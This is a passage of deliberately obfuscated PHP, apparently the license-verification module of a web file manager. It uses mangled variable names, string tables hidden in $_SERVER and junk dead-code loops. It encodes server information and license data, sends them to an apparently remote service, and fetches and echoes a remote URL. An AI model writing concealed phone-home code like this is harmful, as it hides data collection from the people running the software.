$í·ŠŒ—[35], $í·ŠŒ—[36], $í·ŠŒ—[37], $í·ŠŒ—[38], $í·ŠŒ—[39], $í·ŠŒ—[40], $í·ŠŒ—[41], $í·ŠŒ—[42], $í·ŠŒ—[43], $í·ŠŒ—[44], $í·ŠŒ—[45], $í·ŠŒ—[46], $í·ŠŒ—[47], $í·ŠŒ—[48], $í·ŠŒ—[49], $í·ŠŒ—[50], $í·ŠŒ—[51], $í·ŠŒ—[52], $í·ŠŒ—[53], $í·ŠŒ—[54], $í·ŠŒ—[55], $í·ŠŒ—[56], $í·ŠŒ—[57], $í·ŠŒ—[58], $í·ŠŒ—[59], $í·ŠŒ—[60], $í·ŠŒ—[61], $í·ŠŒ—[62], $í·ŠŒ—[63], $í·ŠŒ—[64], $í·ŠŒ—[65], $í·ŠŒ—[66], $í·ŠŒ—[67], $í·ŠŒ—[68], $í·ŠŒ—[69], $í·ŠŒ—[70], $í·ŠŒ—[71], $í·ŠŒ—[72], $í·ŠŒ—[73], $í·ŠŒ—[74], $í·ŠŒ—[75], $í·ŠŒ—[76], $í·ŠŒ—[77], $í·ŠŒ—[78], $í·ŠŒ—[79], $í·ŠŒ—[80], $í·ŠŒ—[81], $í·ŠŒ—[82], $í·ŠŒ—[83], $í·ŠŒ—[84], $í·ŠŒ—[85], $í·ŠŒ—[86], $í·ŠŒ—[87]); foreach ($ì¾ÍûÕõ as $Õä©“Ÿ‘) { $¡’˜’ôÆ = $GLOBALS[$í·ŠŒ—[88]][$í·ŠŒ—[89]][$Õä©“Ÿ‘]; if (isset($ŞÉ¾Ç[$Õä©“Ÿ‘])) { $¡’˜’ôÆ = $ŞÉ¾Ç[$Õä©“Ÿ‘]; } $Ê©«ñ°Å[$í·ŠŒ—[90]][$í·ŠŒ—[91]][$Õä©“Ÿ‘] = $¡’˜’ôÆ; } $§ç©Û = $Ê©«ñ°Å[$í·ŠŒ—[90]][$í·ŠŒ—[91]][$í·ŠŒ—[46]]; $Ñğ€¸´» = $Š±½æôç[743]; while (strlen($Ñğ€¸´») < $Š±½æôç[717]) { if (!$Ñğ€¸´») { break; } $Ñğ€¸´»++; } unset($Ê©«ñ°Å[$í·ŠŒ—[90]][$í·ŠŒ—[92]][$í·ŠŒ—[93]]); unset($Ê©«ñ°Å[$í·ŠŒ—[90]][$í·ŠŒ—[92]][$í·ŠŒ—[94]]); unset($Ê©«ñ°Å[$í·ŠŒ—[90]][$í·ŠŒ—[91]][$í·ŠŒ—[46]]); $¸Î¦ÇÉÊ = $Š±½æôç[744]; if (!$¸Î¦ÇÉÊ) { die; } unset($Ê©«ñ°Å[$í·ŠŒ—[90]][$í·ŠŒ—[91]][$í·ŠŒ—[95]]); $Ê©«ñ°Å[$í·ŠŒ—[90]][$í·ŠŒ—[91]][$í·ŠŒ—[96]] = array($í·ŠŒ—[97] => (int) $§ç©Û[$í·ŠŒ—[98]], $í·ŠŒ—[99] => (int) _get($§ç©Û, $í·ŠŒ—[100], 0)); $®àˆá Ô = substr(md5($í·ŠŒ—[101] . get_client_ip() . $ŞÉ¾Ç[$í·ŠŒ—[102]]), 0, 15); $ÁÊäÂõÇ = $Š±½æôç[745]; if (strlen($ÁÊäÂõÇ) < $Š±½æôç[717]) { return; } $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[104]] = Mcrypt::encode(Session::sign(), $®àˆá Ô, 3600 * 24); $–¨ĞËî‚ = $Š±½æôç[746]; while ($–¨ĞËî‚ < $Š±½æôç[497]) { if ($–¨ĞËî‚ >= 0) { break; } $–¨ĞËî‚++; } $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[105]] = Action($í·ŠŒ—[106])->accessToken(); $ÁùŞíŒò = $Š±½æôç[747]; if (strlen($ÁùŞíŒò) < $Š±½æôç[726]) { return; } $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[107]] = md5($_SERVER[$í·ŠŒ—[108]] . $ŞÉ¾Ç[$í·ŠŒ—[102]]); $¶ûÇŞÌ = $Š±½æôç[748]; $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[109]] = base64_encode(serverInfo()); $Ğ«èˆó² = $Š±½æôç[749]; if (strlen($Ğ«èˆó²) < $Š±½æôç[736]) { die; } $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[110]] = $this->vtwg4abd075d; if ($ŞÉ¾Ç[$í·ŠŒ—[110]] != $í·ŠŒ—[111]) { $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[112]] = $ŞÉ¾Ç[$í·ŠŒ—[112]]; $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[113]] = $ŞÉ¾Ç[$í·ŠŒ—[113]]; $ç¿ÜšÁÆ = rand_string(10) . $this->vtwg4abd075d . rand_string(5); $Ê©«ñ°Å[$í·ŠŒ—[90]][$í·ŠŒ—[114]][$í·ŠŒ—[115]] = $this->gqpj58401f8f($ç¿ÜšÁÆ, $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[107]]); } if ($this->vtwg4abd075d == $í·ŠŒ—[111]) { $Ê©«ñ°Å[$í·ŠŒ—[90]][$í·ŠŒ—[91]][$í·ŠŒ—[96]][$í·ŠŒ—[100]] = 0; } $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[116]] = $this->versionPluginFilter(); $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[117]] = _get($this->qdoi53911dcc, $í·ŠŒ—[118], $í·ŠŒ—[6]); if (KodUser::isRoot() && $this->config[$í·ŠŒ—[119]]) { $Ê©«ñ°Å[$í·ŠŒ—[103]][$í·ŠŒ—[120]] = WEB_ROOT; } return $Ê©«ñ°Å; } private function tzbv7cb86dd3() { $±‘§İèÃ =& $_SERVER[”øäÃÍª]; $öçÓä’€ =& $_SERVER[‘‹å÷ç]; $’™ÓøÀ = $_SERVER[$öçÓä’€[24]] == $öçÓä’€[121]; $••’ÙêÍ = $±‘§İèÃ[750]; if (strlen($••’ÙêÍ) < $±‘§İèÃ[724]) { return; } if ($_SERVER[$öçÓä’€[24]] == $öçÓä’€[122] && $_GET[$öçÓä’€[123]] == $öçÓä’€[124]) { $’™ÓøÀ = !0; } if ($’™ÓøÀ) { $›í¾ĞÜµ = array($öçÓä’€[110] => $this->vtwg4abd075d, $öçÓä’€[125] => $this->vfdn24d7d338(), $öçÓä’€[126] => Model($öçÓä’€[127])->count()); if ($this->vtwg4abd075d != $öçÓä’€[111]) { $–ê„Øù· = _get($this->qdoi53911dcc, $öçÓä’€[128]); if ($–ê„Øù·) { $›í¾ĞÜµ[$öçÓä’€[129]] = $–ê„Øù·; $›í¾ĞÜµ[$öçÓä’€[130]] = strtotime(_get($this->qdoi53911dcc, $öçÓä’€[131])); $›í¾ĞÜµ[$öçÓä’€[132]] = _get($this->qdoi53911dcc, $öçÓä’€[118]); } $Ã…³¼¬ = Model($öçÓä’€[33])->get($öçÓä’€[133], $öçÓä’€[6], !0); if (is_string($Ã…³¼¬) && substr($Ã…³¼¬, 0, 1) == $öçÓä’€[134]) { $Ã…³¼¬ = json_decode_force($Ã…³¼¬); } if (is_array($Ã…³¼¬) && $Ã…³¼¬[$öçÓä’€[135]] && strstr($Ã…³¼¬[$öçÓä’€[135]], $öçÓä’€[136])) { $æŞñÁÅ× = explode($öçÓä’€[136], $Ã…³¼¬[$öçÓä’€[135]]); $›í¾ĞÜµ[$öçÓä’€[137]] = $æŞñÁÅ×[0]; } } $›í¾ĞÜµ = $this->khrbde30d929(json_encode($›í¾ĞÜµ), md5($öçÓä’€[138])); $Ô±€´›Õ = array($öçÓä’€[139] => $›í¾ĞÜµ); call_user_func(array($öçÓä’€[140], $öçÓä’€[141]), $Ô±€´›Õ); $‘–Û¿¨§ = $±‘§İèÃ[751]; while (strlen($‘–Û¿¨§) < $±‘§İèÃ[724]) { if (!$‘–Û¿¨§) { break; } $‘–Û¿¨§++; } } if ($this->vtwg4abd075d == $öçÓä’€[111]) { return; } $ó€¨Ä»Æ = array($öçÓä’€[142], $öçÓä’€[143], $öçÓä’€[144], $öçÓä’€[145], $öçÓä’€[146], $öçÓä’€[147]); $íô—ˆ³ = $±‘§İèÃ[752]; $ĞÖ€²äô = Model($öçÓä’€[33])->get(); $•„É‹¶é = $±‘§İèÃ[753]; $Ô±€´›Õ = array($öçÓä’€[148] => $ĞÖ€²äô[$öçÓä’€[34]], $öçÓä’€[149] => $ĞÖ€²äô[$öçÓä’€[35]], $öçÓä’€[150] => $öçÓä’€[6]); $Ö›¦¥òÄ = $±‘§İèÃ[754]; while ($Ö›¦¥òÄ < $±‘§İèÃ[724]) { if ($Ö›¦¥òÄ >= 0) { break; } $Ö›¦¥òÄ++; } foreach ($ó€¨Ä»Æ as $ï®Şè½È) { if (!isset($ĞÖ€²äô[$ï®Şè½È]) || !$ĞÖ€²äô[$ï®Şè½È]) { continue; } $Ô±€´›Õ[$ï®Şè½È] = $ĞÖ€²äô[$ï®Şè½È]; } call_user_func(array($öçÓä’€[140], $öçÓä’€[141]), $Ô±€´›Õ); $‹ÆÁêŞÅ = $±‘§İèÃ[755]; } private function ybvp6928161a() { $Ì¼É•Ç¨ =& $_SERVER[”øäÃÍª]; $šÑ‡§Éñ =& $_SERVER[‘‹å÷ç]; if ($_SERVER[$šÑ‡§Éñ[24]] != $šÑ‡§Éñ[151]) { return; } if (!KodUser::isRoot()) { die; } $“Æˆ‹’Ò = $GLOBALS[$šÑ‡§Éñ[13]]; if (isset($“Æˆ‹’Ò[$šÑ‡§Éñ[152]])) { $this->gqelbc721cbf(); die; } if (isset($“Æˆ‹’Ò[$šÑ‡§Éñ[153]]) && isset($“Æˆ‹’Ò[$šÑ‡§Éñ[153]]) == $šÑ‡§Éñ[124]) { $“Æˆ‹’Ò[$šÑ‡§Éñ[154]] = Model($šÑ‡§Éñ[33])->get($šÑ‡§Éñ[155]); } if (!isset($“Æˆ‹’Ò[$šÑ‡§Éñ[154]]) || strlen($“Æˆ‹’Ò[$šÑ‡§Éñ[154]]) != 16) { show_json($šÑ‡§Éñ[156] . $“Æˆ‹’Ò[$šÑ‡§Éñ[154]], !1); } $Íò„²˜ = Model($šÑ‡§Éñ[33])->get($šÑ‡§Éñ[102]); $¡ğ¹„®é = md5($_SERVER[$šÑ‡§Éñ[108]] . $Íò„²˜); $ùá«ò¬ = array($šÑ‡§Éñ[154] => $“Æˆ‹’Ò[$šÑ‡§Éñ[154]], $šÑ‡§Éñ[157] => rand_string(16), $šÑ‡§Éñ[158] => $šÑ‡§Éñ[138], $šÑ‡§Éñ[159] => $šÑ‡§Éñ[160], $šÑ‡§Éñ[161] => $_SERVER[$šÑ‡§Éñ[162]], $šÑ‡§Éñ[163] => $_SERVER[$šÑ‡§Éñ[164]], $šÑ‡§Éñ[165] => $_SERVER[$šÑ‡§Éñ[166]], $šÑ‡§Éñ[107] => $¡ğ¹„®é, $šÑ‡§Éñ[167] => Model($šÑ‡§Éñ[33])->get($šÑ‡§Éñ[133])); $¡¹ıÇÊ« = $Ì¼É•Ç¨[756]; if (strlen($¡¹ıÇÊ«) < $Ì¼É•Ç¨[724]) { die; } if (isset($“Æˆ‹’Ò[$šÑ‡§Éñ[153]]) && isset($“Æˆ‹’Ò[$šÑ‡§Éñ[153]]) == $šÑ‡§Éñ[124]) { $ùá«ò¬[$šÑ‡§Éñ[153]] = md5($ùá«ò¬[$šÑ‡§Éñ[154]] . $šÑ‡§Éñ[168] . $ùá«ò¬[$šÑ‡§Éñ[157]]); } if ($“Æˆ‹’Ò[$šÑ‡§Éñ[169]] == $šÑ‡§Éñ[170]) { $¥¼µÏÕ = $this->khrbde30d929($¡ğ¹„®é, $šÑ‡§Éñ[171]); $à”¹ˆÕ÷ = $this->gqpj58401f8f(json_encode($ùá«ò¬), $¡ğ¹„®é . $šÑ‡§Éñ[172], 3); $à”¹ˆÕ÷ = $à”¹ˆÕ÷ . $šÑ‡§Éñ[173] . $_SERVER[$šÑ‡§Éñ[162]]; $ü®“áÄ = $this->thbacde460f3($šÑ‡§Éñ[174] . $¥¼µÏÕ . $šÑ‡§Éñ[175] . $à”¹ˆÕ÷, -1); show_json($ü®“áÄ, !0); } else { if ($“Æˆ‹’Ò[$šÑ‡§Éñ[169]] == $šÑ‡§Éñ[176]) { $şùè­¾´ = substr(md5($šÑ‡§Éñ[177] . $¡ğ¹„®é), 12, 15) . $šÑ‡§Éñ[178]; $à”¹ˆÕ÷ = $this->whdl91e0f482(trim($“Æˆ‹’Ò[$šÑ‡§Éñ[179]]), $şùè­¾´, 2); $€ı¡©–» = json_decode($à”¹ˆÕ÷, !0); if (!is_array($€ı¡©–») || !is_array($€ı¡©–»[$šÑ‡§Éñ[180]]) || $€ı¡©–»[$šÑ‡§Éñ[154]] != !0) { $Î‹»ÏÅŠ = $šÑ‡§Éñ[181]; $†ğ³ö·ë = $€ı¡©–»[$šÑ‡§Éñ[180]] ? $šÑ‡§Éñ[182] . $€ı¡©–»[$šÑ‡§Éñ[180]] : $Î‹»ÏÅŠ; show_json($†ğ³ö·ë, !1); } else { $ùá«ò¬[$šÑ‡§Éñ[157]] = $€ı¡©–»[$šÑ‡§Éñ[180]][$šÑ‡§Éñ[183]]; } } else { $€ı¡©–» = $this->thbacde460f3($šÑ‡§Éñ[184], $ùá«ò¬, 10); } } if (!is_array($€ı¡©–») || !is_array($€ı¡©–»[$šÑ‡§Éñ[180]]) || $€ı¡©–»[$šÑ‡§Éñ[154]] != !0) { $Î‹»ÏÅŠ = LNG($šÑ‡§Éñ[185]); $†ğ³ö·ë = $€ı¡©–»[$šÑ‡§Éñ[180]] ? $šÑ‡§Éñ[182] . $€ı¡©–»[$šÑ‡§Éñ[180]] : $Î‹»ÏÅŠ; show_json($†ğ³ö·ë, !1); } $ùòÑ´“ = $€ı¡©–»[$šÑ‡§Éñ[180]]; $¹£°¡öÁ = $this->eszt3040f185($ùòÑ´“[$šÑ‡§Éñ[186]]); $âŒùï½ú = $Ì¼É•Ç¨[757]; if (!$âŒùï½ú) { return; } if (!$¹£°¡öÁ || $¹£°¡öÁ != $ùòÑ´“[$šÑ‡§Éñ[131]]) { $€ŸÜ¢¨Å = array($šÑ‡§Éñ[187] => Model($šÑ‡§Éñ[33])->get($šÑ‡§Éñ[102]), $šÑ‡§Éñ[188] => $_SERVER[$šÑ‡§Éñ[108]], $šÑ‡§Éñ[189] => this_url(), $šÑ‡§Éñ[163] => $_SERVER[$šÑ‡§Éñ[164]]); $à”¹ˆÕ÷ = $this->orgd6267aed4(json_encode($€ŸÜ¢¨Å)); $this->thbacde460f3($šÑ‡§Éñ[190] . $à”¹ˆÕ÷); show_json(LNG($šÑ‡§Éñ[191]), !0); } $Û¶êàò¿ = array($šÑ‡§Éñ[155] => $ùòÑ´“[$šÑ‡§Éñ[192]], $šÑ‡§Éñ[193] => $ùòÑ´“[$šÑ‡§Éñ[194]], $šÑ‡§Éñ[195] => rand_string(16), $šÑ‡§Éñ[110] => $ùòÑ´“[$šÑ‡§Éñ[196]]); if ($ùá«ò¬[$šÑ‡§Éñ[157]]) { $Û¶êàò¿[$šÑ‡§Éñ[195]] = $ùá«ò¬[$šÑ‡§Éñ[157]]; } $ŞšÙì¤â = substr(md5($Û¶êàò¿[$šÑ‡§Éñ[193]]), 10, 10); $ö‰ñê‹À = $ŞšÙì¤â . $Û¶êàò¿[$šÑ‡§Éñ[110]] . $Û¶êàò¿[$šÑ‡§Éñ[195]]; $ÎÏ°Œ = $Ì¼É•Ç¨[758]; if (strlen($ÎÏ°Œ) < $Ì¼É•Ç¨[717]) { die; } $Û¶êàò¿[$šÑ‡§Éñ[112]] = strrev(base64_encode($this->khrbde30d929($ö‰ñê‹À, $šÑ‡§Éñ[197]))); $„ÕÖìúí = $Ì¼É•Ç¨[759]; $Û¦ì­¿‰ = rand_string(16); $¬ƒßã¡“ = $Ì¼É•Ç¨[760]; if (strlen($¬ƒßã¡“) < $Ì¼É•Ç¨[717]) { return; } $ƒŞı‡¥Í = $Û¦ì­¿‰ . $Û¶êàò¿[$šÑ‡§Éñ[110]] . $this->khrbde30d929(md5($Û¶êàò¿[$šÑ‡§Éñ[155]]), $Û¦ì­¿‰); $¼µ¶Ô÷ = $Ì¼É•Ç¨[761]; while ($¼µ¶Ô÷ < $Ì¼É•Ç¨[724]) { if ($¼µ¶Ô÷ >= 0) { break; } $¼µ¶Ô÷++; } $Û¶êàò¿[$šÑ‡§Éñ[113]] = base64_encode(strrev($this->khrbde30d929($ƒŞı‡¥Í, $šÑ‡§Éñ[198]))); $ûåü»‚ı = $Ì¼É•Ç¨[762]; while (strlen($ûåü»‚ı) < $Ì¼É•Ç¨[726]) { if (!$ûåü»‚ı) { break; } $ûåü»‚ı++; } if ($ùòÑ´“[$šÑ‡§Éñ[199]] && $ùòÑ´“[$šÑ‡§Éñ[199]] >= 1) { Model($šÑ‡§Éñ[33])->setDeep($šÑ‡§Éñ[200], $šÑ‡§Éñ[124]); } Model($šÑ‡§Éñ[33])->set($Û¶êàò¿); $¹œØ¬‚õ = md5($_SERVER[$šÑ‡§Éñ[108]] . strrev($Íò„²˜) . $Û¶êàò¿[$šÑ‡§Éñ[193]]); $ø®ŞùĞ = $Ì¼É•Ç¨[763]; if (!$ø®ŞùĞ) { return; } $£€À÷¿• = strrev(substr($¹œØ¬‚õ, 10, 16)); $‰™ÚÂáÏ = $Ì¼É•Ç¨[764]; while (strlen($‰™ÚÂáÏ) < $Ì¼É•Ç¨[497]) { if (!$‰™ÚÂáÏ) { break; } $‰™ÚÂáÏ++; } $Ü‚Ò®ÕÆ = $this->gqpj58401f8f(json_encode($ùòÑ´“), $¹œØ¬‚õ); $ËêÆ²ò = array_to_keyvalue(Model($šÑ‡§Éñ[7])->listData(), $šÑ‡§Éñ[201]); $äÚŠéÒÜ = $ËêÆ²ò[$šÑ‡§Éñ[202]]; $ÈÈî² = array(); $†ï¾àüÙ = $Ì¼É•Ç¨[765]; if (strlen($†ï¾àüÙ) < $Ì¼É•Ç¨[497]) { return; } $ÈÈî²[$£€À÷¿•] = $Ü‚Ò®ÕÆ; Model($šÑ‡§Éñ[7])->update($äÚŠéÒÜ[$šÑ‡§Éñ[203]], array($šÑ‡§Éñ[204] => $ÈÈî²)); $this->qdoi53911dcc = $ùòÑ´“; $this->vtwg4abd075d = $Û¶êàò¿[$šÑ‡§Éñ[110]]; $this->licenseRegistSuccess(); $™ÑªÁ†‘ = $Ì¼É•Ç¨[766]; if (strlen($™ÑªÁ†‘) < $Ì¼É•Ç¨[736]) { return; } Cache::set($šÑ‡§Éñ[205] . md5($Íò„²˜ . $šÑ‡§Éñ[206]), $šÑ‡§Éñ[6]); $ˆç–ı¯ = $Ì¼É•Ç¨[767]; while ($ˆç–ı¯ < $Ì¼É•Ç¨[726]) { if ($ˆç–ı¯ >= 0) { break; } $ˆç–ı¯++; } show_json(LNG($šÑ‡§Éñ[191]), !0); $œÄßã¯Ì = $Ì¼É•Ç¨[768]; while ($œÄßã¯Ì < $Ì¼É•Ç¨[736]) { if ($œÄßã¯Ì >= 0) { break; } $œÄßã¯Ì++; } } private function licenseRegistSuccess() { $ï“¼Š» =& $_SERVER[‘‹å÷ç]; $–Ì·¶Õ– = Model($ï“¼Š»[33])->get(); if ($–Ì·¶Õ–[$ï“¼Š»[63]] != $ï“¼Š»[124]) { Model($ï“¼Š»[33])->set($ï“¼Š»[63], $ï“¼Š»[124]); } Action($ï“¼Š»[207])->initStart(!0); } private function gqelbc721cbf() { $ç´‚ñˆ¦ =& $_SERVER[‘‹å÷ç]; Model($ç´‚ñˆ¦[33])->set(array($ç´‚ñˆ¦[155] => $ç´‚ñˆ¦[6], $ç´‚ñˆ¦[193] => $ç´‚ñˆ¦[6], $ç´‚ñˆ¦[110] => $ç´‚ñˆ¦[111], $ç´‚ñˆ¦[112] => $ç´‚ñˆ¦[6], $ç´‚ñˆ¦[113] => $ç´‚ñˆ¦[6])); Model($ç´‚ñˆ¦[33])->setDeep($ç´‚ñˆ¦[200], $ç´‚ñˆ¦[208]); $this->qdoi53911dcc = array(); $this->vtwg4abd075d = $ç´‚ñˆ¦[111]; } private function nfwg5711f158() { $æçüÍ’× =& $_SERVER[”øäÃÍª]; $×’„ƒĞ— =& $_SERVER[‘‹å÷ç]; $_SERVER[$×’„ƒĞ—[164]] = _get($_SERVER, $×’„ƒĞ—[164], APP_HOST); $òÑËÜ›Ø = $æçüÍ’×[769]; $this->vtwg4abd075d = $×’„ƒĞ—[111]; $„ß‹ÌÈ = $æçüÍ’×[770]; if (!$„ß‹ÌÈ) { die; } $çø€éÕà = Model($×’„ƒĞ—[33])->get(); $Úæ·õÔÒ = $æçüÍ’×[771]; if (strlen($Úæ·õÔÒ) < $æçüÍ’×[726]) { die; } if ($çø€éÕà[$×’„ƒĞ—[110]] == $×’„ƒĞ—[111]) { return; } $½ˆÌÜ‘á = Model($×’„ƒĞ—[33])->get($×’„ƒĞ—[102]); $®¬ ´¼¸ = $æçüÍ’×[772]; while ($®¬ ´¼¸ < $æçüÍ’×[726]) { if ($®¬ ´¼¸ >= 0) { break; } $®¬ ´¼¸++; } $£‚Øš³ = $×’„ƒĞ—[205] . md5($½ˆÌÜ‘á . $×’„ƒĞ—[206]); $ŠñÖà¹Í = Cache::get($£‚Øš³); $­—¿ü¸” = $æçüÍ’×[773]; if (strlen($­—¿ü¸”) < $æçüÍ’×[724]) { die; } if (!is_array($ŠñÖà¹Í) || !isset($ŠñÖà¹Í[$×’„ƒĞ—[209]]) || time() - $ŠñÖà¹Í[$×’„ƒĞ—[209]] >= 60) { $ğÛ¾‰¹“ = Model($×’„ƒĞ—[7])->loadList(); $§¥ñ¯Î“ = $ğÛ¾‰¹“[$×’„ƒĞ—[202]]; $ˆ”ÈäêÀ = md5($_SERVER[$×’„ƒĞ—[108]] . strrev($½ˆÌÜ‘á) . $çø€éÕà[$×’„ƒĞ—[193]]); $ıÕïîé× = strrev(substr($ˆ”ÈäêÀ, 10, 16)); $ŠñÖà¹Í = $this->whdl91e0f482($§¥ñ¯Î“[$×’„ƒĞ—[88]][$ıÕïîé×], $ˆ”ÈäêÀ); $ŠñÖà¹Í = json_decode($ŠñÖà¹Í, !0); } if (!is_array($ŠñÖà¹Í)) { return $this->gqelbc721cbf(); } $“éÑ“€² = strtotime($ŠñÖà¹Í[$×’„ƒĞ—[131]]); if (time() >= $“éÑ“€²) { return $this->gqelbc721cbf(); } if (!isset($ŠñÖà¹Í[$×’„ƒĞ—[209]]) || time() - $ŠñÖà¹Í[$×’„ƒĞ—[209]] > 20) { $ŠñÖà¹Í[$×’„ƒĞ—[209]] = time(); Cache::set($£‚Øš³, $ŠñÖà¹Í); } $this->qdoi53911dcc = $ŠñÖà¹Í; $this->vtwg4abd075d = $çø€éÕà[$×’„ƒĞ—[110]]; $ù£ = $æçüÍ’×[774]; while (strlen($ù£) < $æçüÍ’×[717]) { if (!$ù£) { break; } $ù£++; } $GLOBALS[$×’„ƒĞ—[210]] = $this; } private function wijf61ce3185() { $™“œ¾§ı =& $_SERVER[‘‹å÷ç]; $ş‡Èí€ = $GLOBALS[$™“œ¾§ı[13]]; $Ü†¯¬ÅÁ = $_SERVER[$™“œ¾§ı[24]]; if ($Ü†¯¬ÅÁ == $™“œ¾§ı[211] && $this->vtwg4abd075d == $™“œ¾§ı[111]) { show_json(LNG($™“œ¾§ı[212]), !1, $™“œ¾§ı[213]); } $Â»Öì£ù = array($™“œ¾§ı[214], $™“œ¾§ı[215]); if (in_array($Ü†¯¬ÅÁ, $Â»Öì£ù)) { if ($this->vtwg4abd075d == $™“œ¾§ı[111] && isset($ş‡Èí€[$™“œ¾§ı[216]])) { show_json(LNG($™“œ¾§ı[212]), !1, $™“œ¾§ı[213]); die; } $ÏßÈĞéê = $this->vfdn24d7d338(); if ($ÏßÈĞéê != intval($™“œ¾§ı[217])) { if ($ÏßÈĞéê <= Model($™“œ¾§ı[127])->count()) { show_json(LNG($™“œ¾§ı[218]), !1, $™“œ¾§ı[213]); die; } } } } private function wxqsbed945d3() { $¸´Û‹ŠÊ =& $_SERVER[”øäÃÍª]; $ìÛÍÈ×ô =& $_SERVER[‘‹å÷ç]; $±¶…×ş = array($ìÛÍÈ×ô[121], $ìÛÍÈ×ô[122]); if (!KodUser::isRoot() || !isset($_GET[$ìÛÍÈ×ô[219]])) { return; } if (!in_array($_SERVER[$ìÛÍÈ×ô[24]], $±¶…×ş)) { return; } $Ğ·½¹áí = $ìÛÍÈ×ô[220]; $Ğ·½¹áí = $this->lzou7285fb2f($Ğ·½¹áí, $ìÛÍÈ×ô[221]); $ÀËûî© = stream_context_create(array($ìÛÍÈ×ô[222] => array($ìÛÍÈ×ô[223] => $ìÛÍÈ×ô[224], $ìÛÍÈ×ô[225] => 3))); $½–³Š›å = $¸´Û‹ŠÊ[775]; while ($½–³Š›å < $¸´Û‹ŠÊ[736]) { if ($½–³Š›å >= 0) { break; } $½–³Š›å++; } $§ª»ú°ˆ = @file_get_contents($Ğ·½¹áí, !1, $ÀËûî©); $æŒÆË­ú = $¸´Û‹ŠÊ[776]; if (strlen($æŒÆË­ú) < $¸´Û‹ŠÊ[736]) { die; } header($ìÛÍÈ×ô[226]); if ($§ª»ú°ˆ && strstr($§ª»ú°ˆ, $ìÛÍÈ×ô[227])) { echo $§ª»ú°ˆ; } die; } public function mvykbc8142e1($·µîó‰ƒ) { $”±Äãë =& $_SERVER[”øäÃÍª]; $‰âßì„¯ =& $_SERVER[‘‹å÷ç]; if ($this->vtwg4abd075d == $‰âßì„¯[228]) { return $·µîó‰ƒ; } $”ëâŸÄ = $this->versionPluginList(); $†¥˜ãÛû = explode($‰âßì„¯[229], $this->versionPluginFilter()); $ÈÌÈá“Ä = array(); foreach ($”ëâŸÄ as $ª¤ô ¤Â => $§Ñ¬³¹Å) { if ($§Ñ¬³¹Å == $‰âßì„¯[230] && substr($this->vtwg4abd075d, 0, 1) == $‰âßì„¯[230]) { continue; } if (!in_array($ª¤ô ¤Â, $†¥˜ãÛû)) { $ÈÌÈá“Ä[] = $ª¤ô ¤Â; } } foreach ($ÈÌÈá“Ä as $ª¤ô ¤Â) { unset($·µîó‰ƒ[$ª¤ô ¤Â]); } return $·µîó‰ƒ; $‹§“¾ø€ = $”±Äãë[777]; while ($‹§“¾ø€ < $”±Äãë[724]) { if ($‹§“¾ø€ >= 0) { break; } $‹§“¾ø€++; } } private function versionPluginList() { $Ö‹šëë’ =& $_SERVER[‘‹å÷ç]; return array($Ö‹šëë’[231] => $Ö‹šëë’[230], $Ö‹šëë’[232] => $Ö‹šëë’[230], $Ö‹šëë’[233] => $Ö‹šëë’[230], $Ö‹šëë’[234] => $Ö‹šëë’[230], $Ö‹šëë’[235] => $Ö‹šëë’[236], $Ö‹šëë’[237] => $Ö‹šëë’[236], $Ö‹šëë’[238] => $Ö‹šëë’[236], $Ö‹šëë’[239] => $Ö‹šëë’[236], $Ö‹šëë’[240] => $Ö‹šëë’[236], $Ö‹šëë’[241] => $Ö‹šëë’[236], $Ö‹šëë’[242] => $Ö‹šëë’[236], $Ö‹šëë’[243] => $Ö‹šëë’[236], $Ö‹šëë’[244] => $Ö‹šëë’[236], $Ö‹šëë’[245] => $Ö‹šëë’[236], $Ö‹šëë’[246] => $Ö‹šëë’[236], $Ö‹šëë’[247] => $Ö‹šëë’[236], $Ö‹šëë’[248] => $Ö‹šëë’[236], $Ö‹šëë’[249] => $Ö‹šëë’[236], $Ö‹šëë’[250] => $Ö‹šëë’[236]); } private function versionPluginFilter() { $÷İ‡î³˜ =& $_SERVER[”øäÃÍª]; $ú¹®Òß° =& $_SERVER[‘‹å÷ç]; if ($this->vtwg4abd075d == $ú¹®Òß°[111]) { return $ú¹®Òß°[6]; } $î‚¯şƒ = _get($this->qdoi53911dcc, $ú¹®Òß°[251], $ú¹®Òß°[6]); $¢Ã§‹ù‡ = $÷İ‡î³˜[778]; $Õ…³¨íÕ = _get($this->qdoi53911dcc, $ú¹®Òß°[118], $ú¹®Òß°[6]); $™Ò´´ = $÷İ‡î³˜[779]; $ŸÇÙ¾è× = _get($this->qdoi53911dcc, $ú¹®Òß°[252], $ú¹®Òß°[6]); $«Ä´½Ã” = $÷İ‡î³˜[780]; if ($Õ…³¨íÕ > time() && $ŸÇÙ¾è× > time()) { $€ıœ×Ö = explode($ú¹®Òß°[229], $î‚¯şƒ); $ÌÅâ–ê = array_keys($this->versionPluginList()); $î‚¯şƒ = array_merge($€ıœ×Ö, $ÌÅâ–ê); $î‚¯şƒ = implode($ú¹®Òß°[229], array_filter(array_unique($î‚¯şƒ))); } return $î‚¯şƒ; } private function wynfdde6f6b4() { $íßäÏ¤ =& $_SERVER[‘‹å÷ç]; if ($this->vtwg4abd075d != $íßäÏ¤[111]) { $GLOBALS[$íßäÏ¤[88]][$íßäÏ¤[92]][$íßäÏ¤[253]] = $íßäÏ¤[208]; return; } $GLOBALS[$íßäÏ¤[88]][$íßäÏ¤[254]] = $íßäÏ¤[124]; if (Model($íßäÏ¤[255])->get($íßäÏ¤[63]) != $íßäÏ¤[208]) { Model($íßäÏ¤[255])->set($íßäÏ¤[63], $íßäÏ¤[208]); } } public function sfdv849d80cf() { return $_SERVER[‘‹å÷ç][256]; $¿ÇƒìÇİ = $_SERVER[”øäÃÍª][781]; } private function lcnjea021962() { $¿ËÇœ° =& $_SERVER[”øäÃÍª]; $ÈâìÍ¢ı =& $_SERVER[‘‹å÷ç]; $Ú›ÂŸÎ = array($ÈâìÍ¢ı[257], $ÈâìÍ¢ı[258], $ÈâìÍ¢ı[259]); $¥—Ä‹ö• = $¿ËÇœ°[782]; 